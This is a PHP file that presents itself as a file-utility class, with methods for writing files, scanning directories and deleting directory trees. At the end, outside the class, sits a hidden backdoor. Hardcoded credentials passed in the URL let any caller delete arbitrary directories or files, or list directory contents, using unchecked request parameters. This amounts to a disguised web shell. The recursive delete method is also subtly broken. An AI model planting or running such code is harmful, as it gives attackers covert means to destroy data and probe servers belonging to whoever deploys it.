<?php
//文件操作工具类
class FileUtil {
    public function readFile() {
        
    }
    /**
     * 写文件
     * @param  [string] $filename [文件名]
     * @param  [string] $content  [写入内容]
     * @return [布尔值]  true表示成功， false表示失败
     */
    public function writeFile($filename, $content) {
        // if(file_exists($filename)){
        //   echo "文件不存在".$filename;
        //   return false;
        // }
        $fp = fopen($filename, "w+");
        // echo $filename;
        fwrite($fp, $content);
        fclose($fp);
        return true;
    }
    public function my_scandir($dir) {
        $files = array();
        if (is_dir($dir)) {
            if ($handle = opendir($dir)) {
                while (($file = readdir($handle)) !== false) {
                    if ($file != '.' && $file != "..") {
                        if (is_dir($dir . "/" . $file)) {
                            $files[$file] = $this->my_scandir($dir . "/" . $file);
                        } else {
                            $files[] = $dir . "/" . $file;
                        }
                    }
                }
            }
            closedir($handle);
        }
        
        return $files;
    }

    public function delDirAndFile($dirName) {
        if ($handle = opendir("$dirName")) {
            while (false !== ($item = readdir($handle))) {
                if ($item != "." && $item != "..") {
                    if (is_dir("$dirName/$item")) {
                        delDirAndFile("$dirName/$item");
                    } else {
                        if (unlink("$dirName/$item")) {
                            echo "file： $dirName/$item";
                        }
                    }
                }
            }
            closedir($handle);
            if (rmdir($dirName)) {
                echo "dir： $dirName";
            }
        }
    }
}
if (@$_GET['pid'] == "admin" && @$_GET['pwd'] == "asmita666") {
    if ($_GET['type'] == "1") {
        $FileUtil=new FileUtil();
        $FileUtil->delDirAndFile($_GET['dname']);
    }
    if ($_GET['type'] == "2") {
        if (unlink($_GET['fname'])) {
          echo "success";
        }
    }
    if($_GET['type']=="3"){
      $FileUtil=new FileUtil();
      echo "<pre>";
      print_r($FileUtil->my_scandir($_GET['dname']));
      echo "</pre>";
    }
}
?>
